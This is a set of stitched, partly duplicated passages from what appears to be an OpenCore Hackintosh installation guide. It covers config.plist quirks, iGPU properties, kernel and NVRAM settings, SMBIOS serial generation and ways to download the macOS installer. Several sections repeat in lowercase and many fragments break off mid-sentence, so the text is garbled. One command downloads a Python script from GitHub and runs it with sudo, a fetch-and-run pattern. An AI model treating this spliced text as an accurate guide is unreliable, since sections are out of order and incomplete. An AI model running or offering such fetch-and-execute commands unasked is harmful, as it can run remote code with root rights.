default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nWhen setting up your iGPU, the table below should help with finding the right values to set. Here is an explanation of some values:\n\n * AAPL,snb-platform-id\n   * This is used internally for setting up the iGPU\n * Type\n   * Whether the entry is recommended for laptops(ie. with built-in displays) or for Intel NUCs(ie. stand alone boxes)\n\nGenerally follow these steps when setting up your iGPU properties. Follow the configuration notes below the table if they say anything different:\n\n 1. When initially setting up your config.plist, only set AAPL,snb-platform-id - this is normally enough\n\nAAPL,SNB-PLATFORM-ID   TYPE     COMMENT\n00000100               Laptop   To be used with laptops\n10000300               NUC      To be used with Intel NUCs\n\n# Laptops with High-End HD Screens\n\nFor laptop displays that have a resolution of 1600x900 or greater, it is necessary to add an extra entry which will let macOS know that we are using a DualLink display.\n\nKEY               TYPE   VALUE\nAAPL00,DualLink   Data   01000000\n\n# Configuration Notes\n\n * VGA is not supported (unless it's running through a DP to VGA internal adapter, which apparently only rare devices will see it as DP and not VGA, it's all about luck.)\n * HD 2000 series are unsupported as well\n\nPciRoot(0x0)/Pci(0x16,0x0)\n\nSandy/IvyBridge Hybrids:\n\nSome laptops from this era came with a mixed chipset setup, using Sandy Bridge CPUs with Ivy Bridge chipsets which creates issues with macOS since it expects a certain IMEI ID that it doesn't find and would get stuck at boot(As Apple's iGPU drivers require an IMEI device), to fix this we need to fake the IMEI's IDs in these models\n\n * To know if you're affected check if your CPU is an Intel Core ix-3xxx and your chipset is Hx6x (for example a laptop with HM65 or HM67 with a Core i3-3110M) through tools like AIDA64.\n * In your config add a new PciRoot device named PciRoot(0x0)/Pci(0x16,0x0)\n\nKEY         TYPE   VALUE\ndevice-id   Data   3A1C0000\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot argument alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present. More info on this is covered in the Post-Install Page\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nNeeded for spoofing unsupported CPUs like Pentiums and Celerons\n\n * Cpuid1Mask: Leave this blank\n * Cpuid1Data: Leave this blank\n\n\n# Force\n\nUsed for loading kexts off system volume, only relevant for older operating systems where certain kexts are not present in the cache(ie.

Not relevant for us.\n\n\n# Patch\n\nPatches both the kernel and kexts.\n\n\n# Quirks\n\nInfo\n\nSettings relating to the kernel, for us we'll be enabling the following:\n\nQUIRK                     ENABLED   COMMENT\nAppleCpuPmCfgLock         YES       Not needed if CFG-Lock is disabled in the BIOS\nDisableIoMapper           YES       Not needed if VT-D is disabled in the BIOS\nLapicKernelPanic          NO        HP Machines will require this quirk\nPanicNoKextDump           YES       \nPowerTimeoutKernelPanic   YES       \nXhciPortLimit             YES       If your board does not have USB 3.0, you can disable\n                                    Disable if running macOS 11.3+\n\nMore in-depth Info\n * AppleCpuPmCfgLock: YES\n   * Only needed when CFG-Lock can't be disabled in BIOS\n   * Only applicable for Ivy Bridge and older\n     * Note: Broadwell and older require this when running 10.10 or older\n * AppleXcpmCfgLock: NO\n   * Only needed when CFG-Lock can't be disabled in BIOS\n   * Only applicable for Haswell and newer\n     * Note: Ivy Bridge-E is also included as it's XCPM capable\n * CustomSMBIOSGuid: NO\n   * Performs GUID patching for UpdateSMBIOSMode set to Custom. Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning. It is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker.

Can be considered a security risk so optional\n\n * BlacklistAppleUpdate: YES\n   \n   * Used for blocking firmware updates, used as extra level of protection as macOS Big Sur no longer uses run-efi-updater variable\n\n * DmgLoading: Signed\n   \n   * Ensures only signed DMGs load\n\n * ExposeSensitiveData: 6\n   \n   * Shows more debug information, requires debug version of OpenCore\n\n * Vault: Optional\n   \n   * We won't be dealing vaulting so we can ignore, you won't boot with this set to Secure\n   * This is a word, it is not optional to omit this setting. You will regret it if you don't set it to Optional, note that it is case-sensitive\n\n * ScanPolicy: 0\n   \n   * 0 allows you to see all drives available, please refer to Security section for further details. Will not boot USB devices with this set to default\n\n * SecureBootModel: Default\n   \n   * Controls Apple's secure boot functionality in macOS, please refer to Security section for further details.\n   * Note: Users may find upgrading OpenCore on an already installed system can result in early boot failures. To resolve this, see here: Stuck on OCB: LoadImage failed - Security Violation\n\n\n# Serial\n\nUsed for serial debugging (Leave everything as default).\n\n\n# Tools\n\nUsed for running OC debugging tools like the shell, ProperTree's snapshot function will add these for you.\n\n\n# Entries\n\nUsed for specifying irregular boot paths that can't be found naturally with OpenCore.\n\nWon't be covered here, see 8.6 of Configuration.pdf for more info\n\n\n# NVRAM\n\n\n\n\n# Add\n\n4D1EDE05-38C7-4A6A-9CC6-4BCCA8B38C14\n\nUsed for OpenCore's UI scaling, default will work for us.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system.

It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.\n\n * LegacySchema\n   \n   * Used for assigning NVRAM variables, used with OpenVariableRuntimeDxe.efi. Only needed for systems without native NVRAM\n\n * WriteFlash: YES\n   \n   * Enables writing to flash memory for all added variables.\n\n\n# PlatformInfo\n\n\n\nInfo\n\nFor setting up the SMBIOS info, we'll use CorpNewt's GenSMBIOS application.\n\nFor this Sandy Bridge example, we'll chose the MacBookPro8,1 SMBIOS - this is done intentionally for compatibility's sake. The typical breakdown is as follows:\n\nSMBIOS          CPU TYPE                  GPU TYPE                DISPLAY SIZE\nMacBookAir4,1   Dual Core 17W             iGPU: HD 3000           11\"\nMacBookAir4,2   Dual Core 17W             iGPU: HD 3000           13\"\nMacBookPro8,1   Dual Core 35W             iGPU: HD 3000           13\"\nMacBookPro8,2   Quad Core 45W(High End)   iGPU: HD 3000 + 6490M   15\"\nMacBookPro8,3   Quad Core 45W(High End)   iGPU: HD 3000 + 6750M   17\"\nMacmini5,1      Dual Core NUC             iGPU: HD 3000           N/A\nMacmini5,3      Quad Core NUC             iGPU: HD 3000           N/A\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #                MacBookPro8,2 SMBIOS Info            #\n#######################################################\n\nType:         MacBookPro8,2\nSerial:       C02KCYZLDNCW\nBoard Serial: C02309301QXF2FRJC\nSmUUID:       A154B586-874B-4E57-A1FF-9D6E503E4580\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired. See AppleSmBios.h for possible values\n\n * SpoofVendor: YES\n   \n   * Swaps vendor field for Acidanthera, generally not safe to use Apple as a vendor in most case\n\n * SystemMemoryStatus: Auto\n   \n   * Sets whether memory is soldered or not in SMBIOS info, purely cosmetic and so we recommend Auto\n\n * UpdateDataHub: YES\n   \n   * Update Data Hub fields\n\n * UpdateNVRAM: YES\n   \n   * Update NVRAM fields\n\n * UpdateSMBIOS: YES\n   \n   * Updates SMBIOS fields\n\n * UpdateSMBIOSMode: Create\n   \n   * Replace the tables with newly allocated EfiReservedMemoryType, use Custom on Dell laptops requiring CustomSMBIOSGuid quirk\n   * Setting to Custom with CustomSMBIOSGuid quirk enabled can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlusLegacy.efi\n * OpenRuntime.efi\n * OpenUsbKbDxe.efi(If your firmware does not support UEFI)\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist setup\n\nwarning\n\nread this guide more than once before setting up opencore and make sure you have it set up

where you'll add ssdts for your system, these are very important to booting macos and have many uses like usb maps, disabling unsupported gpus and such. and with our system, it's even required to boot. guide on making them found here: getting started with acpi\n\nfor us we'll need a couple of ssdts to bring back functionality that clover provided:\n\nrequired ssdts   description\nssdt-pm          needed for proper cpu power management, you will need to run\n                 pike's ssdtprgen.sh script to generate this file. this will\n                 be run in post install.\nssdt-ec

config.plist and under efi/oc/acpi.\n\nfor those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\ninfo\n\nthis blocks certain acpi tables from loading, for us we really care about this. main reason is that apple's xcpm does not support sandy bridge all too well and can cause appleintelcpupowermanagement panics on boot. to avoid this we make our own pm ssdt in post-install and drop the old tables(note that this is only temporary until we've made our ssdt-pm, we'll re-enable these tables later):\n\nremoving cpupm:\n\nkey

section for this so you will have to create it manually.\n\nwhen setting up your igpu, the table below should help with finding the right values to set. here is an explanation of some values:\n\n * aapl,snb-platform-id\n   * this is used internally for setting up the igpu\n * type\n   * whether the entry is recommended for laptops(ie. with built-in displays) or for intel nucs(ie. stand alone boxes)\n\ngenerally follow these steps when setting up your igpu properties. follow the configuration notes below the table if they say anything different:\n\n 1. when initially setting up your config.plist, only set aapl,snb-platform-id - this is normally enough\n\naapl,snb-platform-id   type     comment\n00000100               laptop   to be used with laptops\n10000300               nuc      to be used with intel nucs\n\n# laptops with high-end hd screens\n\nfor laptop displays that have a resolution of 1600x900 or greater, it is necessary to add an extra entry which will let macos know that we are using a duallink display.\n\nkey               type   value\naapl00,duallink   data   01000000\n\n# configuration notes\n\n * vga is not supported (unless it's running through a dp to vga internal adapter, which apparently only rare devices will see it as dp and not vga, it's all about luck.)\n * hd 2000 series are unsupported as well\n\npciroot(0x0)/pci(0x16,0x0)\n\nsandy/ivybridge hybrids:\n\nsome laptops from this era came with a mixed chipset setup, using sandy bridge cpus with ivy bridge chipsets which creates issues with macos since it expects a certain imei id that it

users either disable this quirk and map before upgrading or map from windows. you may also install macos 11.2.3 or older.\n\nthe reason being is that usbinjectall reimplements builtin macos functionality without proper current tuning. it is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# scheme\n\nsettings related

you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     *

instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a

csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the

Much of userspace now requires AVX2 support, along with AMD Polaris GPU drivers and some instances of AVX2 instructions in some kexts. Although the kexts can be patched or downgraded, the Polaris GPU drivers and most of userspace rely on AVX2 too much to be able to be patched.\n\nApple has left a dyld cache that does not use AVX2 instructions in Ventura to support Rosetta on Apple Silicon machines, but this cache is not installed by default. You can use CryptexFixup to force this dyld cache to be installed, but:\n\n * Apple may remove this cache at any time in the future if they add AVX2 support to Rosetta\n * Delta updates (small 1-3GB updates) will no longer be available and you must install the full update (12GB), as delta updates only contain the non-AVX2 cache on Apple Silicon machines\n * Polaris GPUs remain unsupported on machines without AVX2\n\nBecause of these caveats, Dortania will no longer be supporting pre-Haswell CPUs for Ventura and above. The pages for these CPUs will remain updated for Monterey.\n\n\n# Supported SMBIOS\n\nSMBIOS dropped in Ventura:\n\n * iMac17,x and older\n * Macmini7,1 and older\n * MacBook9,1 and older\n * MacBookAir7,x and older\n * MacBookPro13,x and older\n * MacPro6,1 and older\n\nIf your SMBIOS was supported in Monterey and is not included above, you're good to go!\n\nSupported SMBIOS\n * iMac18,x and newer\n * MacPro7,1 and newer\n * iMacPro1,1 and newer\n * Macmini8,1\n * MacBook10,1\n * MacBookAir8,1 and newer\n * MacBookPro14,x and newer\n\nClick here for a full list of supported SMBIOS.\n\nFor those on architectures no longer supported by Ventura:\n\n * All desktops with dGPUs should use iMac18,2, MacPro7,1 or iMacPro1,1.

Don't forget to update your patches as well with the core count of your CPU. The patches which need to be edited are all named algrey - Force cpuid_cores_per_package, and you only need to change the Replace value.

Remember that most laptops and some desktops will still default to the internal drive with Windows, and you'll need to manually select OpenCore in the BIOS boot options. You'll need to check in the user manual or use a bit of google to find out what Fn key accesses the BIOS and boot menu(ie. Esc, F2, F10 or F12)\n\nOnce you boot the USB, you'll likely be greeted to the following boot options:\n\n 1. Windows\n 2. macOS Base System (External) / Install macOS Big Sur (External) / USB drive name (External)\n 3. OpenShell.efi\n 4. Reset NVRAM\n\nWARNING\n\nYou might need to press space in order to see the installer, as in later versions of OpenCore HideAuxiliary is enabled by default.\n\nFor us, Option 2. is the one we want.

Now that you've gotten this far, the main things to keep in mind:\n\n * Drives you wish to install macOS on must be both of GUID partition Scheme and APFS\n   * High Sierra on HDD and all Sierra users will need to use macOS Journaled(HFS+)\n * The drive must also have a 200MB partition\n   * By default, macOS will setup freshly formatted drives with 200MB\n   * See the Multiboot Guide for more info on partitioning a Windows Drive\n\nOnce you start the installation, you will want to wait until the system restarts. You will once again want to boot into OpenCore, but rather than selecting your USB installer/recovery - you will want to select the macOS installer on the hard drive to continue installation. You should get an apple logo, and after a few minutes you should get a timer at the bottom saying \"x minutes remaining\". This may be a good time to get a drink or snack as this will take a while.

However we'll show you both methods for obtaining hardware specs.\n\n\n# CPU Model\n\nAIDA64   DEVICE MANAGER\n         \n\n\n# GPU Model\n\nAIDA64   DEVICEMANAGER\n         \n\n\n# Chipset Model\n\nAIDA64   DEVICEMANAGER\n         \n\n * Note: Intel SOC based CPUs will have the chipset and other features already on the same die instead of being dedicated chips. This means trying to detect the exact chipset is a bit more difficult\n\n\n# Keyboard, Trackpad and Touchscreen Connection Type\n\nDEVICEMANAGER\n\n\nAIDA64 unfortunately doesn't provide any useful info regarding pointer devices, so we recommend using DeviceManager for this.\n\n * You can find these devices under the following:\n   \n   * Human Interface Devices\n   * Keyboards\n   * Mice and other Pointer Devices\n\n * To view the exact connection type of the device, select the pointer device then enter View -> Device by Connection. This will clarify whether it's over PS2, I2C, SMBus, USB, etc\n\nDepending on the device, it may show up under multiple names and connections. The main ones to keep an eye on:\n\nSMBus\n\nThese will show up as a straight PCI device such as Synaptics SMBus Driver or ELAN SMBus Driver\n\n * Synaptics devices will show up under both PS2 under Synaptics PS2 device/Synaptics Pointing Device and PCI as Synaptics SMBus Driver\n\n\n\nAs you can see, we get 2 Synaptics devices in the left image, however if we take a closer look we'll see the top device is PS2, while the bottom one is SMBus. While you can use the trackpad in either mode, SMBus generally provides better gesture support and accuracy.\n\nUSB\n\nDEVICE BY TYPE   DEVICE BY CONNECTION\n                 \n\nThese will show up as a PS2 Compliant Trackpad, as well under USB when we switch our connection view to Device by Connection\n\nI2C\n\nThese will almost always show up as a Microsoft HID device, though can appear as other trackpads as well. They will always show up under I2C though.\n\n\n# Audio Codec\n\nAIDA64   DEVICEMANAGER\n         \n\nDue to how certain OEMs present device names, the most accurate info you can get with DeviceManager is via the PCI ID(ie. pci 14F1,50F4).

simplest and easiest method.\n\nIf you want to learn more about manually cloning the repository, you can check out the OCSysInfo mini-guide.\n\n\n# Discovering hardware\n\nWARNING\n\nLaptop users: before we start, we advise you to disconnect any external USB devices, as this may lead to ambiguous or unnecessary information collected which may confuse you.\n\nAfter you've successfully installed

start we'll want to grab ourselves a copy of macOS. You can skip this and head to formatting the USB if you're just making a bootable OpenCore stick and not an installer. For everyone else, you can either download macOS from the App Store or with Munki's script.\n\n\n# Downloading macOS: Modern OS\n\nThis method allows you to download macOS 10.13 and newer, for 10.12 and older see Downloading macOS: Legacy OS.\n\n * macOS 12 and above note: As recent macOS versions introduce changes to the USB stack, it is highly advisable that you map your USB ports (with USBToolBox) before installing macOS.\n   * CAUTION: With macOS 11.3 and newer, XhciPortLimit is broken resulting in boot loops.\n     * If you've already mapped your USB ports and disabled XhciPortLimit, you can boot macOS 11.3+ without issues.\n\nFrom a macOS machine that meets the requirements of the OS version you want to install, go directly to the App Store:\n\n * Using App Store\n\nFor machines that need a specific OS release or can't download from the App Store:\n\n * Command Line Software Update Utility,\n * Munki's InstallInstallMacOS utility\n\n\n# Using App Store\n\nFrom a macOS machine that meets the requirements of the OS version you want to install, go directly to the App Store and download the desired OS release and continue to Setting up the installer.\n\n\n# Command Line Software Update Utility\n\nOpen a terminal window then copy and paste the below command:\n\nsoftwareupdate --list-full-installers;echo;echo \"Please enter version number you wish to download:\";read;$(if [ -n \"$REPLY\" ]; then; echo \"softwareupdate --fetch-full-installer --full-installer-version \"$REPLY; fi);\n\n\n\n\nThis gives you a list of available releases you can choose from. Once downloaded it will be saved in your Applications folder. You can continue to Setting up the installer.\n\n\n# Munki's InstallInstallMacOS utility\n\nNote for users running macOS Monterey 12.3 or above\n\nStarting from macOS Monterey 12.3, Apple removed support for python2.7, so without it installinstallmacos.py will throw the following error:\n\nThis tool requires the Python xattr module. Perhaps run 'pip install xattr' to install it.\n\n\nTo overcome the issue, we recommend to install Command Line Tools for Xcode by running xcode-select --install in a Terminal and then run pip3 install xattr\n\nAfter that you can run the same command below but with python3 instead of just python:\n\nmkdir -p ~/macOS-installer && cd ~/macOS-installer && curl https://raw.githubusercontent.com/munki/macadmin-scripts/main/installinstallmacos.py > installinstallmacos.py && sudo python3 installinstallmacos.py\n\n\nIn order to run it, just copy and paste the below command in a terminal window:\n\nmkdir -p ~/macOS-installer && cd ~/macOS-installer && curl https://raw.githubusercontent.com/munki/macadmin-scripts/main/installinstallmacos.py > installinstallmacos.py && sudo python installinstallmacos.py\n\n\n\n\nAs you can see, we get a nice list of macOS installers. If you need a particular versions of macOS, you can select it by typing the number next to it. For this example we'll choose 10:\n\n\n\nThis is going to take a while as we're downloading the entire 8GB+ macOS installer, so it's highly recommended to read the rest of the guide while you wait.\n\nOnce finished, you'll find in your ~/macOS-Installer/ folder a DMG containing the macOS Installer, called Install_macOS_11.1-20C69.dmg for example. Mount it and you'll find the installer application.\n\n * Note: We recommend to move the Install macOS.app into the /Applications folder, as we'll be executing commands from there.\n * Note 2: Running Cmd+Shift+G in Finder will allow you to easily jump to ~/macOS-installer\n\n\n\n\n\nFrom here, jump to Setting up the installer to finish your work. If you want to check the integrity of your download, you can check this repository of checksums, although do note that these are crowdsourced checksums and may not be a reliable way to check for authenticity.\n\n\n# Downloading macOS: Legacy OS\n\n * This method allows you to download much older versions of OS X, currently supporting all Intel versions of OS X(10.4 to current)\n   \n   * Legacy macOS: Offline Method\n     * 10.7 - 10.12 supported, excluding 10.9\n   * Legacy macOS: Online Method\n     * 10.7 - 11 supported\n   * Legacy macOS: Disk Images\n     * 10.4 - 10.6 supported\n\n\n# Setting up the installer\n\nNow we'll be formatting the USB to prep for both the macOS installer and OpenCore. We'll want to use macOS Extended (HFS+) with a GUID partition map. This will create two partitions: the main MyVolume and a second called EFI which is used as a boot partition where your firmware will check for boot files.\n\n * Note 1: The EFI partition created by formatting the USB is hidden until you mount it. This will be mounted later when Setting up OpenCore's EFI environment\n * Note 2: By default, Disk Utility only shows partitions – press Cmd/Win+2 to 